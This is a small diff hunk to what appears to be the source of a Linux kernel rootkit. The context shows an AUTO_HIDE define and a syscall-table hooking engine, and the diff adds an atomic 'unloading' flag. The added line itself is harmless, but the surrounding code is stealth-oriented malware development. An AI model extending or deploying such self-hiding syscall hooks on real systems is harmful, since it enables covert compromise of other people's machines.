@@ -4,6 +4,7 @@
 
 
 #define AUTO_HIDE 1
+atomic_t unloading = ATOMIC_INIT(0);      /* ← ADD THIS LINE */
 
 /* hooking engine (syscall-table swap) */
 #include "ftrace/ftrace.h"
